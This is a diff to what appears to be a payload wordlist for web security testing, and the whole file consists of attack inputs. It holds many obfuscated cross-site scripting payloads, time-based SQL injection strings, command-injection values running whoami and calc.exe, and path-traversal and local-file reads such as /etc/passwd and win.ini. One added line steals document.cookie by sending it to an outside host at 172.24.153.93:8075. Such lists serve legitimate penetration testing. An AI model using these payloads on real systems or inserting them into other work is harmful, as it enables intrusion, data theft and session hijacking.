@@ -1,16 +1,36 @@
 t";calc.exe
 <a href=jav%26%23x61%3bscript:alert(2)>
+c:/windows/win.ini
+c:/windows/system32/drivers/etc/hosts
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe src="javascript:alert(1)"></iframe> 
+</script>alert(4)<iframe src="javascript:alert(1)"></iframe> 
+'-alert(5)-'
+</script><img src=x onerror=alert('testxss')>
 if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"*/
 cmd.exe /c whoami
 s'),pg_sleep(4);--
+<iframe src='file:///etc/passwd'></iframe>
+ '"/</div><div onmouseover="alert('test')">ox</div>
 window[['a'][0] + 'lert'](1337)
 /*\"<sVg/oNloAd=alert(document.domain)//>\x3e
+"><script><a href="javascript:alert(document.cookie)">LOL</a>
+"<img src=x onerror=confirm(document.domain)>br><"
+"><img src=x:alert(alt) onerror=eval(src) alt=0>
+<iframe width="560" height="315" src="javascript:javascript:alert(document.cookie)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+--'`"><img src=x>kdskf${{7*7}}
+<img/src/onerror=alert('XSS')>
+"-alert(document.domain)-"
+ <a href="javascript%26colon;alert(1111)">click 
+[].sort.call`${alert}1337`
+[].map.call`${eval}\\u{61}lert\x281337\x29`
+�script�alert(�XSS�)�/script�
+😋img src=x onerror=alert(document.domain)//💛
 window[[%27a%27][0]%252b%27lert%27](1337)
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
-t/../../../../t.txt
-/../../../../t1.txt
-t\..\..\..\..\t.txt
-\..\..\..\..\t1.txt
+../../../
 <img/src/oneror=alert(5)>
 test"/><a href="data:text/html,<script>alert(4)</script>">ada</a>
 "><Svg Only=1 OnLoad=confirm(document.domain)>
@@ -25,3 +45,4 @@ test\r\ncalc.exe
 123;whoami
 %0at;`whoami`;
 %00%20;`calc.exe`
+<img src=x onerror="this.src='http://172.24.153.93:8075/?'+document.cookie; this.removeAttribute('onerror');">
